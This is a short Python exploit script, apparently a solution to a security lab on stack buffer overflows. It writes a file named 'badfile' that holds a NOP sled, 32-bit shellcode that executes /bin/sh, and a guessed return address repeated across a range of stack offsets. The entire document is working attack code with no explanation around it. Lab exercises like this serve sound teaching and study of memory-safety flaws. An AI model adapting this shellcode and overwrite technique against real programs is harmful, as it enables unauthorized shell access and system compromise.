#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode = (
    # Larger NOP sled for stability
    "\x90" * 50 +
    # 32-bit shellcode from the lab document
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
    "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 300               # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
buffer_addr = 0xffffadaa  # Ensure it points inside the shellcode
target_addr = buffer_addr + 300 + 25  # Correct offset from our calculation

# Strategy: For a buffer of size X, the return address is typically at offset X+12
# For buffer sizes 100-200, place return address at every 4 bytes in this range
for offset in range(112, 216, 4):
    content[offset:offset + 4] = (target_addr).to_bytes(4,byteorder='little')
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
